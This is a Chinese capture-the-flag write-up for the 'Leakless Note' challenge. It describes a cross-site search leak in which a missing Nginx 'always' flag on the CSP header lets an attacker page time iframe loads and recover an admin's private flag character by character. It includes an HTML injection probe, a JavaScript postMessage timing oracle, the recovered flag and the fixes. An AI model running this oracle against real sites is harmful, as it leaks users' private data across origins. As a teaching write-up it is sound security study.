# Leakless Note

## 题目简述

管理员账户有一篇正文为 flag 的私有搜索数据。`search.php` 只搜索当前会话用户的文章：命中时返回 200，未命中时返回 404。页面内容受同源策略保护，脚本无法直接读取，但 Nginx 只在成功响应上添加 CSP，导致两种状态的 iframe 行为不同。

题目要求利用这一差异构造 XS-Search 计时 oracle，按前缀逐字符恢复格式为 `SEKAI{[a-z]+}` 的 flag。

## 解题过程

搜索代码把查询词放进参数化 `LIKE`，不存在 SQL 注入：

```php
$stmt = $db->prepare(
    "SELECT * FROM posts
     WHERE username=? AND contents LIKE ?"
);
$stmt->execute([
    $_SESSION["user"],
    "%" . $_GET["query"] . "%"
]);

if (count($posts) == 0) {
    http_response_code(404);
}
```

真正的状态差异来自 Nginx：

```nginx
add_header Content-Security-Policy
  "default-src 'self'; script-src 'none';
   object-src 'none'; frame-ancestors 'none';";
```

这里没有 `always`。因此：

- 查询命中：状态码 200，响应带 `frame-ancestors 'none'`，不能被 iframe 嵌入。
- 查询未命中：状态码 404，响应不带该 CSP，可以被 iframe 加载。

攻击者先注册普通账户。`post.php` 对文章正文没有 HTML 转义，而且读取文章不检查所属用户，所以可为每个候选字符创建一篇公开探针文章：

```html
<iframe src="/search.php?query=SEKAI%7Ba"></iframe>
```

标题可设为候选字符，正文中的查询则为“已知前缀 + 候选字符”。当已登录管理员的 Bot 打开这篇文章时，内层 iframe 是挑战站同源请求，会携带管理员会话并搜索管理员的 flag。

攻击页面位于外部域名。它依次 `window.open` 每篇探针文章，等待其中的第一层 frame 出现，再使用官方解法的消息传递计时放大器：

```javascript
const oracle = async (w, href) => {
  const runs = [];

  for (let i = 0; i < 8; i++) {
    const samples = [];

    for (let j = 0; j < 600; j++) {
      const b = new Uint8Array(1e6);
      const start = performance.now();
      w.frames[0].postMessage(b, "*", [b.buffer]);
      samples.push(performance.now() - start);
    }

    runs.push(samples.reduce((a, b) => a + b, 0));
    w.location = href;
    await sleep(500);
    await waitForFirstFrame(w);
  }

  runs.sort((a, b) => a - b);
  return median(runs.slice(2, -2));
};
```

`ArrayBuffer` 作为 transferable 传递，不需要读取跨源窗口内容；但消息送往正常加载的搜索 frame 与被 CSP 拦截后的 frame 时，累计耗时存在可测差异。每轮发送 600 个 1 MB buffer，做 8 轮并去掉两端异常值，可把微小差异放大。实际使用前应分别制作一个确定命中和确定未命中的控制探针，标定哪一侧耗时更高，不要把固定阈值硬编码到不同机器上。

对字母 `a` 至 `z` 和 `}` 逐一测量，找到与“命中”控制组一致的候选，然后把它追加到 `known`：

```javascript
let known = "SEKAI{";
const alphabet = "abcdefghijklmnopqrstuvwxyz}";

while (!known.endsWith("}")) {
  const result = await measureAllCandidates(known, alphabet);
  known += chooseHitByCalibratedTiming(result);
  await createNextRoundProbePosts(known);
}
```

由于每篇文章的查询内容在创建时固定，每恢复一个字符都要为新前缀生成下一轮探针 URL。管理员 Bot 访问攻击页后只有约 65 秒，应控制每轮采样量，必要时按字符分批运行。

[first-blood 队伍的复现](https://www.kalmarunionen.dk/writeups/2023/sekai/leakless-notes/)使用同一个“200 有 CSP、404 无 CSP”信号，但通过约 50 个标签页和浏览器每源连接队列放大网络耗时；该记录也给出了最终结果：

```text
SEKAI{opleakerorz}
```

## 方法总结

XS-Leak 不需要读取跨源响应，只要秘密能影响可观测的状态码、缓存、加载结果或时间即可。这里数据库查询结果改变了 HTTP 状态码，状态码又决定 CSP 是否存在，最终变成可放大的 iframe 计时信号。修复时至少应使用 `add_header ... always`，保证错误响应同样带 `frame-ancestors 'none'`；还应转义文章正文、限制跨源窗口交互，并避免让秘密搜索结果产生可区分的响应行为。
